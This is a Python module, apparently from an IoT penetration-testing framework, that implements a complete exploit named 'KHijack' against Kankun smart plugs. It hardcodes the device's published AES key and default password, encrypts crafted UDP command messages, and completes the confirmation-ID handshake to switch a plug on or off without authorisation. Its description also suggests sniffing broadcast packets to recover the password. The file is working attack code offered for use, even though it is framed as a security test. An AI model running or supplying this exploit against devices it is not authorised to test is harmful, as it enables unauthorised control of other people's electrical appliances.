"""Support for hijacking a Kankun smart plug."""
import re
import socket

from Crypto.Cipher import AES  # nosec

from expliot.core.tests.test import TCategory, Test, TLog, TTarget

DEFAULT_PORT = 27431
DEFAULT_PASS = "nopassword"
AES_KEY = "fdsl;mewrjope456fds4fbvfnjwaugfo"


# pylint: disable=bare-except
class KHijack(Test):
    """Tests for Kankun smart plugs."""

    def __init__(self):
        """Initialize the test."""
        super().__init__(
            name="hijack",
            summary="Kankun SmartPlug Hijacker",
            descr="This test case connects to the Kankun SmartPlug and sends"
            "unauthorized switch ON/OFF commands to it. If you don't "
            "know the password, try with the default or sniff the network "
            "for UDP packets as the commands containing the password are "
            "broadcasted. You can decrypt the packets easily using the AES "
            "key which is published.",
            author="Aseem Jakhar and Sneha Rajguru",
            email="aseemjakhar@gmail.com",
            ref=["https://payatu.com/hijacking-kankun/"],
            category=TCategory(TCategory.UDP, TCategory.SW, TCategory.EXPLOIT),
            target=TTarget("kankun", "1.0", "ikonke.com"),
        )

        self.argparser.add_argument(
            "-r", "--rhost", required=True, help="IP address of Kankun smart plug"
        )
        self.argparser.add_argument(
            "-p",
            "--rport",
            default=DEFAULT_PORT,
            type=int,
            help="Port number of the smart plug service. Default "
                 "is {}".format(DEFAULT_PORT),
        )
        self.argparser.add_argument(
            "-m",
            "--rmac",
            required=True,
            help="MAC address of Kankun smartplug. Use colon delimited format "
            "with hex digits in small letters ex. ff:ee:dd:00:01:02",
        )
        self.argparser.add_argument(
            "-w",
            "--passwd",
            default=DEFAULT_PASS,
            help="The password (if any) for Kankun. Default is the "
                 "string '{}'".format(DEFAULT_PASS),
        )
        self.argparser.add_argument(
            "-c",
            "--cmd",
            required=True,
            help="The command to send to the smartplug. Valid commands are on / off",
        )

    @staticmethod
    def cipher(string, encrypt=True):
        """
        Encrypt/Decrypt a string using the known AES key of the smart plug.

        Args:
            string(str): The string to encrypt or decrypt
            encrypt(bool): True means encrypt (default), false means decrypt
        Returns:
            str: The encrypted/decrypted string
        """
        aesobj = AES.new(AES_KEY, AES.MODE_ECB)
        if string:
            # AES requires the input length to be in multiples of 16
            while len(string) % 16 != 0:
                string = string + " "
            if encrypt is True:
                return aesobj.encrypt(string)
            return aesobj.decrypt(string)
        return None

    def send_recv(self, ip_addr, port, message):
        """
        Send and then receive encrypted data to/from the smart plug.

        Args:
            ip_addr(str): The IP address of the smartplug
            port(int): Port number of the listening service
            message(str): The plaintext message
        Returns:
            str: The response received from the smart plug
        """
        ret = None
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.connect((ip_addr, port))
            sock.send(self.cipher(message))
            ret = sock.recv(1024)
            ret = self.cipher(ret, encrypt=False)
        except:  # noqa: E722
            TLog.fail("Couldn't receive/decrypt response")
        finally:
            sock.close()
        return ret

    def createmsg(self, cmd, cid=None):
        """
        Create the command message to be sent to the the smart plug

        Args:
            cmd(str): the command to send - open/close/confirm
            cid(str): confirmation id used in confirm command
        Returns:
            str: The command message
        """
        msg = "lan_phone%{}%{}".format(self.args.rmac, self.args.passwd)
        if cmd == "open":
            msg = "{}%open%request".format(msg)
        elif cmd == "close":
            msg = "{}%close%request".format(msg)
        elif cmd == "confirm":
            msg = "{}%confirm#{}%request".format(msg, cid)
        return msg

    @staticmethod
    def get_confirmid(msg):
        """
        Extract the confirmation id from the response message

        Args:
            msg(str): The response message
        Returns:
            str: The confirmation id, if found or None
        """
        cid = re.search(
            r"confirm#(\w+)", msg.decode("utf-8")
        )  # get the confirmation ID number only!!
        if cid is not None:
            return cid.group(1)
        return None

    def execute(self):
        """Execute the test."""

        TLog.generic(
            "Sending Unauthorized command ({}) to Kankun smart plug on ({}) port ({})".format(
                self.args.cmd, self.args.rhost, self.args.rport
            )
        )
        cmd_op = None
        print(
            "--cmd ({}) cmd is on? ({})".format(self.args.cmd, (self.args.cmd == "on"))
        )
        if self.args.cmd.lower() == "on":
            cmd_op = "open"
        elif self.args.cmd.lower() == "off":
            cmd_op = "close"
        else:
            self.result.setstatus(
                passed=False, reason="Unknown --cmd ({})".format(self.args.cmd)
            )
            return
        msg = self.createmsg(cmd_op)
        ret = None
        # Step 1: Send command and receive the confirmation ID response
        ret = self.send_recv(self.args.rhost, self.args.rport, msg)
        self.output_handler(command=msg)
        if ret is None:
            self.result.setstatus(
                passed=False,
                reason="Communication error while sending message({})".format(msg),
            )
            return
        self.output_handler(response=ret.decode("utf-8"))
        # Get the confirmation ID
        cid = self.get_confirmid(ret)
        if cid is None:
            self.result.setstatus(
                passed=False,
                reason="Couldn't extract confirmation id from ({})".format(ret),
            )
            return
        self.output_handler(received_confirmation_id=cid)
        msg = self.createmsg("confirm", cid)
        # Step 2: Send Confirmation command with the confirmation ID and receive ack response
        ret = self.send_recv(self.args.rhost, self.args.rport, msg)
        self.output_handler(command=msg)
        if ret is None:
            self.result.setstatus(
                passed=False,
                reason="Communication error while sending message({})".format(msg),
            )
            return
        self.output_handler(response=ret.decode("utf-8"))
